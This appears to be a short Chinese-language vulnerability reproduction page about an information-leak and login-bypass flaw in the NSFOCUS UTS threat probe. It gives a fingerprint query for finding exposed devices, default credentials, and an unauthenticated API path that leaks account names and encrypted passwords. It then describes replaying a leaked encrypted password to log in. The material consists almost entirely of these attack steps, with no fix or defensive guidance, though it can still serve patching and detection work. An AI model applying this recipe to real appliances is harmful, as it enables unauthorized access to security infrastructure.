---
title: "绿盟 UTS综合威胁探针 信息泄露登陆绕过漏洞"
date: 2026-10-16 09:11:30
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "绿盟"
tags:
  - "绿盟"
  - "未授权访问"
  - "信息泄露"
  - "弱口令"
  - "漏洞复现"
---
## 漏洞描述

绿盟 UTS综合威胁探针 某个接口未做授权导致未授权漏洞

## 漏洞影响

```
绿盟 UTS综合威胁探针
```

## 网络测绘

```
app="NSFOCUS-UTS综合威胁探针"
```

## 漏洞复现

默认口令

```
admin/Nsfocus@123
auditor/auditor
```

登陆页面

![image-20220525150142447](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251501583.png)

验证POC

```
/webapi/v1/system/accountmanage/account
```

![image-20220525150243440](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251502510.png)

这里出现了登录的账号以及加密的 PASS

登陆时的加密字段抓包修改为获取的就可以登陆系统

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251503644.png)

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251503926.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E7%BB%BF%E7%9B%9F-UTS%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md)
